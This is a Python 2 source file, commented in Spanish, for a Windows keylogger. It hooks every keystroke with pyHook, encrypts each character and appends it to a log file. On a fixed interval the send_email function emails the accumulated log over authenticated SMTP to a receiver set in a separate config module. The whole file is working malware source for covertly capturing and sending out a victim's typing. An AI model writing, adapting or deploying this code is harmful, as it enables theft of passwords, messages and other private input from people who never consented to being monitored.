# -*- coding: utf-8 -*-
import sys
import time
import pythoncom
import smtplib
import datetime

import pyHook

import cifrator
import Archivo
import header


def OnKeyboardEvent(event):
    """registra pulsaciones, validando simbolos no validos"""
    print event.Ascii, '\t', chr(event.Ascii)
    if event.Ascii in (list(range(33, 123)) + [8, 13, 32, 9, 209, 241]):  # letras, numeros, teclas de control
        if event.Ascii != 13 and event.Ascii != 8:
            dat = chr(event.Ascii)
        else:
            if event.Ascii == 13:
                dat = '\n'
            else:
                dat = '(del)'
        c = cifrator.cifrar(dat, header.INC_ASCII, header.ONION)
        print "a almacenar: ", c
        Archivo.escribir_add(header.PATH_REGISTER, c)
    else:
        print("no es un simbolo valido")
    return True


def time_out(time_limit):
    """Verifica que el tiempo
    transcurrido no llego al limite"""
    if time.time() > time_limit:
        return True
    else:
        return False


def send_email():
    data = Archivo.leer_and_clean(header.PATH_REGISTER)
    if len(data) == 0: return
    date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
    data = 'Date: ' + date + '\n' + data
    sender = header.SENDER
    pas = header.PAS
    receiver = header.RECEIVER
    subject = "New Log"
    message = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" \
              % (sender, receiver, subject, data)
    print("Mensaje a enviar: " + message)
    try:
        smtp_obj = smtplib.SMTP(header.SERVER, header.PUERTO)
        smtp_obj.ehlo()
        smtp_obj.starttls()
        smtp_obj.login(sender, pas)
        smtp_obj.sendmail(sender, receiver, message)
        smtp_obj.close()
        print 'Successfully sent email!'
    # except smtplib.SMTPException:
    except:
        print 'Error: unable to send email'


'''-------------------------------------------------------------'''
'''-------------------------------------------------------------'''
'''-------------------------------------------------------------'''
'''||   Programa principal, un keylogger q almacena la        ||'''
'''||           informacion en un archivo cifrando            ||'''
'''||         previamente, para su posterior envio            ||'''
'''||                 cada cierto tiempo                      ||'''
'''-------------------------------------------------------------'''
'''-------------------------------------------------------------'''
'''-------------------------------------------------------------'''


def main():
    if Archivo.is_open_file(header.PATH_LOCK):
        print("Retiro voluntario")
        sys.exit()
    else:
        lock = open(header.PATH_LOCK, 'w')

    # se asigna el registrador
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    time_limit = time.time() + header.WAIT_TIME

    # se envia cada time_limit
    while True:
        if time_out(time_limit):
            send_email()
            time_limit = time.time() + header.WAIT_TIME
        pythoncom.PumpWaitingMessages()

main()